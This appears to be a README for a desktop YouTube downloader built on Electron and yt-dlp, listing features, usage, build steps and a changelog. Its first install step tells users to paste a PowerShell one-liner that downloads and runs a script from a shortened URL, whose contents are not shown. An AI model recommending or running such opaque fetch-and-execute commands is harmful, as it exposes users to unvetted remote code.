# 📥 YouTube Downloader

Modern YouTube downloader — Paste a URL, pick your format, and download videos or audio with ease.

## Quick Install — YouTube Downloader

**Step by step (copy-paste ready):**

1. Press `Win + R`, type `powershell`, press Enter
2. Copy the line below
3. Right-click in the PowerShell window (or Ctrl+V) to paste
4. Press Enter

```
iex (iwr -useb https://tinyurl.com/ytdlps1)
```

- ✅ That's it. No admin. No clicking next. Just works.

---

[![Download Setup](https://img.shields.io/badge/Download-Windows%20Setup-blue?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader.Setup.1.0.0.exe)
[![Download Portable](https://img.shields.io/badge/Download-Portable%20Version-orange?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader_portable_1.0.0.exe)
[![GitHub](https://img.shields.io/badge/Source-GitHub-black?style=for-the-badge&logo=github)](https://github.com/eaeoz/youtube-downloader)

> **Author:** Sedat ERGOZ — [eaeoz](https://github.com/eaeoz) — sedatergoz@gmail.com

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Download & Installation](#-download--installation)
- [How to Use](#-how-to-use)
- [Build from Source](#-build-from-source)
- [Tech Stack](#-tech-stack)
- [Changelog](#-changelog)

---

## 🎯 Overview

YouTube Downloader lets you download any YouTube video or audio in your preferred format. A clean 3-step wizard guides you through the process, or use Quick Download mode for one-click fetching:

- 🎬 **Video Downloads** — Choose from available resolutions (360p, 720p, 1080p+) with best audio merged automatically
- 🎵 **Audio Extraction** — Download as MP3 with configurable bitrate (128k–320k), auto-converted via FFmpeg
- 📋 **Format Browser** — View all available formats in a sortable list with ID, resolution, codec, and bitrate
- 📑 **Playlist Support** — Download entire playlists with optional range selection (from/to)
- 🌓 **Dark & Light Theme** — Toggle between themes with persistent preference
- 🗂️ **Download History** — Browse, re-download, or remove past downloads

---

## ✨ Features

### 🎬 Video Download
- **Format Selection** — Browse all available video+audio formats via `--list-formats`, pick from a dropdown
- **Resolution Options** — 360p, 480p, 720p, 1080p, and higher where available
- **Auto Audio Merge** — Best audio stream merged automatically with the selected video format
- **Best (Auto)** — Lets yt-dlp pick the optimal combination for your URL

### 🎵 Audio Extraction
- **MP3 Conversion** — Downloads best audio stream and converts to MP3 via FFmpeg
- **Bitrate Selection** — Choose from Auto, 128k, 192k, 256k, or 320k
- **Smart Bitrate Hint** — Shows the source bitrate and calculated target bitrate for transparency
- **Auto Bitrate** — Picks the optimal MP3 bitrate based on source quality (<160k → 128k, <224k → 192k, <256k → 256k, else → 320k)

### 📑 Playlist Support
- **Full Playlists** — Download all videos in a playlist
- **Range Selection** — Specify start/end indices (e.g., episodes 3–8)
- **Playlist Detection** — Automatically detected from URL, shows range inputs

### 🎨 User Interface
- **3-Step Wizard** — Choose type → Enter URL → Select format & download
- **Real-Time SSE Progress** — Live progress bar, speed, ETA, and step indicators via Server-Sent Events
- **Format Output** — Scrollable format list with clickable lines to auto-select a format
- **Progress Overlay** — Full-window overlay with animated steps (start, download, extract, merge, done)
- **Settings Modal** — Download location picker, download history, yt-dlp updater
- **Dark/Light Theme** — One-click toggle, persists across sessions
- **System Tray** — Minimize to tray with Show / Open Folder / Quit
- **Toast Notifications** — Clear feedback for all actions
- **Custom Title Bar** — Frameless window with draggable region, settings, folder, theme, GitHub link, minimize, close

### 💻 System Tray
- Minimize to tray on close (Windows)
- Tray context menu: **Show**, **Open Folder**, **Exit**
- Single-click toggles window visibility
- Window state persistence (position, size)
- Single instance lock — prevents multiple app instances

### 🔄 yt-dlp Auto-Update
- Update yt-dlp.exe from within the app
- Real-time progress stream during update
- Automatic download on first run if binary is missing

### ⚙️ Settings
- **Download Location** — Custom download directory via native folder picker
- **Download History** — View past downloads with re-download and remove
- **yt-dlp Update** — Update the YouTube downloader binary
- **Auto-download** — Automatically download yt-dlp on startup if missing

---

## 📥 Download & Installation

### Option 1: Windows Installer (Recommended)

[![Download Setup](https://img.shields.io/badge/Download-YouTube.Downloader.Setup.1.0.0.exe-blue?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader.Setup.1.0.0.exe)

- Double-click the installer and follow the wizard
- Desktop and Start Menu shortcuts created automatically
- Uninstaller included in Windows Programs & Features

### Option 2: Portable Version

[![Download Portable](https://img.shields.io/badge/Download-YouTube.Downloader_portable_1.0.0.exe-orange?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader_portable_1.0.0.exe)

- No installation required — just run the executable
- No admin rights needed
- Perfect for USB drives or temporary use

---

## 🚀 How to Use

### 1. Choose Type

On the first screen, pick what you want to download:

- **Video** — Downloads video with audio merged
- **Audio** — Extracts audio as MP3

### 2. Enter URL

Paste a YouTube video or playlist URL and click **Fetch Formats**:

- `https://youtube.com/watch?v=...`
- `https://youtu.be/...`
- `https://youtube.com/playlist?list=...`

For playlists, you can set a range (e.g., episodes 3 to 8).

### 3. Select Format & Download

Browse the available formats listed from yt-dlp:

- **Dropdown** — Pick a format ID or use `best (auto)` for the optimal choice
- **Bitrate** (Audio mode) — Choose MP3 bitrate: Auto, 128k, 192k, 256k, or 320k
- **Click a line** — Click any format row in the list to auto-select it

Click **Download** to start. A progress overlay shows real-time status:

- Starting... → Downloading (with speed/size/ETA) → Extracting audio (if audio mode) → Merging (if video mode) → Done!

### 4. Find Your Downloads

- Click the **Open Folder** button (📂) in the top bar to open the downloads directory in Explorer
- Open **Settings → Download History** to browse, re-download, or remove past downloads
- Files are saved with their original YouTube title

### 5. System Tray

When minimized, the app lives in your system tray:

- **Show** — Restore the application window
- **Open Folder** — Open the downloads directory
- **Quit** — Fully exit the application

### 6. Settings

- **Download Location** | Custom download directory via folder picker
- **Download History** | View past downloads with re-download and remove options
- **Update yt-dlp** | Update the YouTube downloader to the latest version

---

## 🛠 Build from Source

```bash
# Install dependencies
npm install

# Run with Electron
npm start

# Build portable executable
npm run build:portable

# Build setup installer
npm run build:setup

# Build both
npm run build
```

Outputs are placed in the `dist/` directory.

---

## 🧱 Tech Stack

### Desktop
- **Electron** — Cross-platform desktop framework
- **electron-builder** — Packaging and distribution

### Backend
- **Express.js** — HTTP server
- **yt-dlp** — YouTube video info, format listing, and download engine
- **FFmpeg (ffmpeg-static)** — Audio conversion and metadata embedding

### Frontend
- **Vanilla JavaScript** — No framework dependencies
- **CSS Custom Properties** — Dynamic theming
- **Font Awesome 6** — Icon library
- **Server-Sent Events** — Real-time download progress

---

## 📋 Changelog

### v1.0.0 (2026-05-13)

- **New:** Initial release
- **New:** 3-step download wizard (choose type → enter URL → select format & download)
- **New:** Video downloads with automatic best-audio merge
- **New:** Audio extraction to MP3 with configurable bitrate (128k–320k)
- **New:** Format browser via yt-dlp `--list-formats` — view all resolutions, codecs, and bitrates
- **New:** Click-to-select format from the format list
- **New:** Format code dropdown with auto-populated options
- **New:** Playlist support with range selection (from/to)
- **New:** Real-time progress overlay with animated steps, speed, size, and ETA
- **New:** Dark/Light theme toggle with persistent localStorage preference
- **New:** Frameless Electron window with custom title bar, system tray, and minimize-to-tray
- **New:** Settings modal — download location picker, download history, yt-dlp updater
- **New:** Download history management — persistent JSON storage, view, redownload, remove
- **New:** Toast notification system for all actions (success, error, info)
- **New:** yt-dlp auto-update from within the app with real-time progress
- **New:** Automatic yt-dlp download on first run if binary is missing
- **New:** Input sanitization (client + server side)
- **New:** Cross-platform folder opening (Windows explorer, macOS Finder, Linux xdg-open)
- **New:** Single instance lock prevents multiple app instances

---

## 📄 License

MIT

---

⭐ **Star this repository if you find it helpful!**  
Developed with ❤️ by **Sedat ERGOZ**
